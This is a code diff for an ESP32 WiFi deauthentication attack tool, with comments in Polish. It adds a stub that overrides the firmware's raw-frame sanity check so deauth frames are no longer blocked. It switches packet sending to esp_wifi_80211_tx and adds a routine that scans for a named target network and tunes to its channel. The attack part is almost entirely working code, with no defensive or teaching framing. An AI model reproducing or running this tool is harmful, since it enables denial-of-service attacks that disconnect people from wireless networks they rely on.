@@ -12,6 +12,11 @@ uint8_t target_mac[] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
 // Tablica do przechowywania adresów MAC klientów
 uint8_t clients[MAX_CLIENTS][6];
 int client_count = 0;
+int target_channel = 1;
+
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+  return 0;
+}
 
 // Liczba pakietów deauth do wysłania
 const int packet_count = 100;
@@ -198,7 +203,7 @@ void send_deauth_packets(String &client_mac_str, int count) {
     0x01, 0x00    // Powód deautoryzacji
   };
 
-  esp_err_t result = wifi_send_pkt_freedom(deauth_packet, sizeof(deauth_packet), false);
+  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
   if (result == ESP_OK) {
     Serial.println("Packet sent successfully.");
   } else {
@@ -218,7 +223,6 @@ void deauth_promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
 
   // Sprawdź, czy pakiet jest od/do określonego AP (target_mac)
   if (memcmp(addr1, target_mac, 6) == 0 || memcmp(addr2, target_mac, 6) == 0) {
-    //Serial.println("Detected " + String(addr2));
     // Jeśli klient jest nowy, dodaj go do listy
     if (!is_client_known(addr2)) {
       add_client(addr2);
@@ -324,4 +328,20 @@ void clearClients() {
   }
   client_count = 0;  // Zresetuj licznik klientów
   Serial.println("Tablica klientów została wyczyszczona.");
+}
+
+void set_target_channel(const char* target_ssid) {
+    int networks = WiFi.scanNetworks();
+    for (int i = 0; i < networks; i++) {
+        if (strcmp(WiFi.SSID(i).c_str(), target_ssid) == 0) {
+            target_channel = WiFi.channel(i);
+            Serial.print("Znaleziono sieć docelową: ");
+            Serial.println(target_ssid);
+            Serial.print("Ustawiam kanał na: ");
+            Serial.println(target_channel);
+            esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
+            return;
+        }
+    }
+    Serial.println("Nie znaleziono sieci docelowej. Przełączanie kanałów pozostaje ręczne.");
 }
